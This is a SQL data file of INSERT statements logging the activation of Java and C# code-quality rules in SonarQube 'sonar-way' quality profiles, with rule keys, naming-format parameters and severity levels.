INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (100, '2017-11-16 07:37:02.466', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1481;ruleKey=csharpsquid:S1481;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwncCbbGRdfPp-qeS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (101, '2017-11-16 07:37:02.47', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2290;ruleKey=csharpsquid:S2290;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwncGbbGRdfPp-qeT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (102, '2017-11-16 07:37:02.491', NULL, 'key=java-sonar-way-87983:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwncbbbGRdfPp-qeU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (103, '2017-11-16 07:37:02.505', NULL, 'key=java-sonar-way-87983:squid:S00100;ruleKey=squid:S00100;profileKey=java-sonar-way-87983;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwncobbGRdfPp-qeV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (104, '2017-11-16 07:37:02.512', NULL, 'key=java-sonar-way-87983:squid:S00101;ruleKey=squid:S00101;profileKey=java-sonar-way-87983;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwncwbbGRdfPp-qeW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (105, '2017-11-16 07:37:02.518', NULL, 'key=java-sonar-way-87983:squid:S106;ruleKey=squid:S106;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnc2bbGRdfPp-qeX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (106, '2017-11-16 07:37:02.524', NULL, 'key=java-sonar-way-87983:squid:S00107;ruleKey=squid:S00107;profileKey=java-sonar-way-87983;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnc8bbGRdfPp-qeY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (107, '2017-11-16 07:37:02.53', NULL, 'key=java-sonar-way-87983:squid:S00108;ruleKey=squid:S00108;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndCbbGRdfPp-qeZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (108, '2017-11-16 07:37:02.535', NULL, 'key=java-sonar-way-87983:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-sonar-way-87983;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndHbbGRdfPp-qea');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (109, '2017-11-16 07:37:02.541', NULL, 'key=java-sonar-way-87983:squid:S00112;ruleKey=squid:S00112;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndNbbGRdfPp-qeb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (110, '2017-11-16 07:37:02.546', NULL, 'key=java-sonar-way-87983:squid:S00114;ruleKey=squid:S00114;profileKey=java-sonar-way-87983;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndSbbGRdfPp-qec');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (111, '2017-11-16 07:37:02.552', NULL, 'key=java-sonar-way-87983:squid:S00115;ruleKey=squid:S00115;profileKey=java-sonar-way-87983;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndYbbGRdfPp-qed');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (112, '2017-11-16 07:37:02.559', NULL, 'key=java-sonar-way-87983:squid:S00116;ruleKey=squid:S00116;profileKey=java-sonar-way-87983;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnddbbGRdfPp-qee');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (113, '2017-11-16 07:37:02.567', NULL, 'key=java-sonar-way-87983:squid:S00117;ruleKey=squid:S00117;profileKey=java-sonar-way-87983;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndnbbGRdfPp-qef');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (114, '2017-11-16 07:37:02.572', NULL, 'key=java-sonar-way-87983:squid:S00119;ruleKey=squid:S00119;profileKey=java-sonar-way-87983;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndrbbGRdfPp-qeg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (115, '2017-11-16 07:37:02.576', NULL, 'key=java-sonar-way-87983:squid:S00120;ruleKey=squid:S00120;profileKey=java-sonar-way-87983;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwndwbbGRdfPp-qeh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (116, '2017-11-16 07:37:02.587', NULL, 'key=java-sonar-way-87983:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnd7bbGRdfPp-qei');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (117, '2017-11-16 07:37:02.591', NULL, 'key=java-sonar-way-87983:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnd_bbGRdfPp-qej');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (118, '2017-11-16 07:37:02.595', NULL, 'key=java-sonar-way-87983:squid:S128;ruleKey=squid:S128;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneDbbGRdfPp-qek');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (119, '2017-11-16 07:37:02.599', NULL, 'key=java-sonar-way-87983:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneHbbGRdfPp-qel');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (120, '2017-11-16 07:37:02.604', NULL, 'key=java-sonar-way-87983:squid:S135;ruleKey=squid:S135;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneLbbGRdfPp-qem');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (121, '2017-11-16 07:37:02.608', NULL, 'key=java-sonar-way-87983:squid:S899;ruleKey=squid:S899;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneQbbGRdfPp-qen');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (122, '2017-11-16 07:37:02.612', NULL, 'key=java-sonar-way-87983:squid:S1065;ruleKey=squid:S1065;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneUbbGRdfPp-qeo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (123, '2017-11-16 07:37:02.619', NULL, 'key=java-sonar-way-87983:squid:S1066;ruleKey=squid:S1066;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnebbbGRdfPp-qep');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (124, '2017-11-16 07:37:02.628', NULL, 'key=java-sonar-way-87983:squid:S1068;ruleKey=squid:S1068;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnejbbGRdfPp-qeq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (125, '2017-11-16 07:37:02.634', NULL, 'key=java-sonar-way-87983:squid:S1075;ruleKey=squid:S1075;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneqbbGRdfPp-qer');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (126, '2017-11-16 07:37:02.643', NULL, 'key=java-sonar-way-87983:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwneybbGRdfPp-qes');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (127, '2017-11-16 07:37:02.646', NULL, 'key=java-sonar-way-87983:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwne2bbGRdfPp-qet');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (128, '2017-11-16 07:37:02.654', NULL, 'key=java-sonar-way-87983:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwne-bbGRdfPp-qeu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (129, '2017-11-16 07:37:02.663', NULL, 'key=java-sonar-way-87983:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfHbbGRdfPp-qev');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (130, '2017-11-16 07:37:02.667', NULL, 'key=java-sonar-way-87983:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfLbbGRdfPp-qew');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (131, '2017-11-16 07:37:02.671', NULL, 'key=java-sonar-way-87983:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfPbbGRdfPp-qex');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (132, '2017-11-16 07:37:02.675', NULL, 'key=java-sonar-way-87983:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfSbbGRdfPp-qey');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (133, '2017-11-16 07:37:02.678', NULL, 'key=java-sonar-way-87983:squid:S1118;ruleKey=squid:S1118;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfWbbGRdfPp-qez');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (134, '2017-11-16 07:37:02.688', NULL, 'key=java-sonar-way-87983:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfgbbGRdfPp-qe0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (135, '2017-11-16 07:37:02.692', NULL, 'key=java-sonar-way-87983:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfkbbGRdfPp-qe1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (136, '2017-11-16 07:37:02.698', NULL, 'key=java-sonar-way-87983:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfqbbGRdfPp-qe2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (137, '2017-11-16 07:37:02.701', NULL, 'key=java-sonar-way-87983:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnftbbGRdfPp-qe3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (138, '2017-11-16 07:37:02.705', NULL, 'key=java-sonar-way-87983:squid:S1125;ruleKey=squid:S1125;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnfxbbGRdfPp-qe4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (139, '2017-11-16 07:37:02.709', NULL, 'key=java-sonar-way-87983:squid:S1126;ruleKey=squid:S1126;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnf1bbGRdfPp-qe5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (140, '2017-11-16 07:37:02.714', NULL, 'key=java-sonar-way-87983:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnf6bbGRdfPp-qe6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (141, '2017-11-16 07:37:02.718', NULL, 'key=java-sonar-way-87983:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnf-bbGRdfPp-qe7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (142, '2017-11-16 07:37:02.727', NULL, 'key=java-sonar-way-87983:squid:S1133;ruleKey=squid:S1133;profileKey=java-sonar-way-87983;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngHbbGRdfPp-qe8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (143, '2017-11-16 07:37:02.731', NULL, 'key=java-sonar-way-87983:squid:S1134;ruleKey=squid:S1134;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngLbbGRdfPp-qe9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (144, '2017-11-16 07:37:02.735', NULL, 'key=java-sonar-way-87983:squid:S1135;ruleKey=squid:S1135;profileKey=java-sonar-way-87983;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngPbbGRdfPp-qe-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (145, '2017-11-16 07:37:02.739', NULL, 'key=java-sonar-way-87983:squid:S1141;ruleKey=squid:S1141;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngTbbGRdfPp-qe_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (146, '2017-11-16 07:37:02.743', NULL, 'key=java-sonar-way-87983:squid:S1143;ruleKey=squid:S1143;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngXbbGRdfPp-qfA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (147, '2017-11-16 07:37:02.747', NULL, 'key=java-sonar-way-87983:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngbbbGRdfPp-qfB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (148, '2017-11-16 07:37:02.752', NULL, 'key=java-sonar-way-87983:squid:S1148;ruleKey=squid:S1148;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnggbbGRdfPp-qfC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (149, '2017-11-16 07:37:02.757', NULL, 'key=java-sonar-way-87983:squid:S1149;ruleKey=squid:S1149;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnglbbGRdfPp-qfD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (150, '2017-11-16 07:37:02.761', NULL, 'key=java-sonar-way-87983:squid:S1150;ruleKey=squid:S1150;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngpbbGRdfPp-qfE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (151, '2017-11-16 07:37:02.767', NULL, 'key=java-sonar-way-87983:squid:S1153;ruleKey=squid:S1153;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwngubbGRdfPp-qfF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (152, '2017-11-16 07:37:02.774', NULL, 'key=java-sonar-way-87983:squid:S1155;ruleKey=squid:S1155;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwng2bbGRdfPp-qfG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (153, '2017-11-16 07:37:02.778', NULL, 'key=java-sonar-way-87983:squid:S1157;ruleKey=squid:S1157;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwng6bbGRdfPp-qfH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (154, '2017-11-16 07:37:02.782', NULL, 'key=java-sonar-way-87983:squid:S1158;ruleKey=squid:S1158;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwng-bbGRdfPp-qfI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (155, '2017-11-16 07:37:02.786', NULL, 'key=java-sonar-way-87983:squid:S1161;ruleKey=squid:S1161;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhCbbGRdfPp-qfJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (156, '2017-11-16 07:37:02.79', NULL, 'key=java-sonar-way-87983:squid:S1163;ruleKey=squid:S1163;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhGbbGRdfPp-qfK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (157, '2017-11-16 07:37:02.793', NULL, 'key=java-sonar-way-87983:squid:S1165;ruleKey=squid:S1165;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhJbbGRdfPp-qfL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (158, '2017-11-16 07:37:02.802', NULL, 'key=java-sonar-way-87983:squid:S1168;ruleKey=squid:S1168;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhSbbGRdfPp-qfM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (159, '2017-11-16 07:37:02.806', NULL, 'key=java-sonar-way-87983:squid:S1170;ruleKey=squid:S1170;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhWbbGRdfPp-qfN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (160, '2017-11-16 07:37:02.81', NULL, 'key=java-sonar-way-87983:squid:S1171;ruleKey=squid:S1171;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhabbGRdfPp-qfO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (161, '2017-11-16 07:37:02.813', NULL, 'key=java-sonar-way-87983:squid:S1172;ruleKey=squid:S1172;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhdbbGRdfPp-qfP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (162, '2017-11-16 07:37:02.817', NULL, 'key=java-sonar-way-87983:squid:S1174;ruleKey=squid:S1174;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhhbbGRdfPp-qfQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (163, '2017-11-16 07:37:02.821', NULL, 'key=java-sonar-way-87983:squid:S1175;ruleKey=squid:S1175;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhlbbGRdfPp-qfR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (164, '2017-11-16 07:37:02.826', NULL, 'key=java-sonar-way-87983:squid:S1181;ruleKey=squid:S1181;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhqbbGRdfPp-qfS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (165, '2017-11-16 07:37:02.83', NULL, 'key=java-sonar-way-87983:squid:S1182;ruleKey=squid:S1182;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhubbGRdfPp-qfT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (166, '2017-11-16 07:37:02.834', NULL, 'key=java-sonar-way-87983:squid:S1185;ruleKey=squid:S1185;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnhybbGRdfPp-qfU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (167, '2017-11-16 07:37:02.842', NULL, 'key=java-sonar-way-87983:squid:S1186;ruleKey=squid:S1186;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnh6bbGRdfPp-qfV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (168, '2017-11-16 07:37:02.846', NULL, 'key=java-sonar-way-87983:squid:S1190;ruleKey=squid:S1190;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnh-bbGRdfPp-qfW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (169, '2017-11-16 07:37:02.85', NULL, 'key=java-sonar-way-87983:squid:S1191;ruleKey=squid:S1191;profileKey=java-sonar-way-87983;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniCbbGRdfPp-qfX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (170, '2017-11-16 07:37:02.855', NULL, 'key=java-sonar-way-87983:squid:S1192;ruleKey=squid:S1192;profileKey=java-sonar-way-87983;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniHbbGRdfPp-qfY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (171, '2017-11-16 07:37:02.864', NULL, 'key=java-sonar-way-87983:squid:S1193;ruleKey=squid:S1193;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniQbbGRdfPp-qfZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (172, '2017-11-16 07:37:02.869', NULL, 'key=java-sonar-way-87983:squid:S1195;ruleKey=squid:S1195;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniVbbGRdfPp-qfa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (173, '2017-11-16 07:37:02.872', NULL, 'key=java-sonar-way-87983:squid:S1197;ruleKey=squid:S1197;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniYbbGRdfPp-qfb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (174, '2017-11-16 07:37:02.876', NULL, 'key=java-sonar-way-87983:squid:S1199;ruleKey=squid:S1199;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnicbbGRdfPp-qfc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (175, '2017-11-16 07:37:02.88', NULL, 'key=java-sonar-way-87983:squid:S1201;ruleKey=squid:S1201;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnigbbGRdfPp-qfd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (176, '2017-11-16 07:37:02.884', NULL, 'key=java-sonar-way-87983:squid:S1206;ruleKey=squid:S1206;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnikbbGRdfPp-qfe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (177, '2017-11-16 07:37:02.888', NULL, 'key=java-sonar-way-87983:squid:S1210;ruleKey=squid:S1210;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniobbGRdfPp-qff');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (178, '2017-11-16 07:37:02.893', NULL, 'key=java-sonar-way-87983:squid:S1214;ruleKey=squid:S1214;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnitbbGRdfPp-qfg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (179, '2017-11-16 07:37:02.898', NULL, 'key=java-sonar-way-87983:squid:S1215;ruleKey=squid:S1215;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwniybbGRdfPp-qfh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (180, '2017-11-16 07:37:02.906', NULL, 'key=java-sonar-way-87983:squid:S1217;ruleKey=squid:S1217;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwni6bbGRdfPp-qfi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (181, '2017-11-16 07:37:02.91', NULL, 'key=java-sonar-way-87983:squid:S1219;ruleKey=squid:S1219;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwni-bbGRdfPp-qfj');
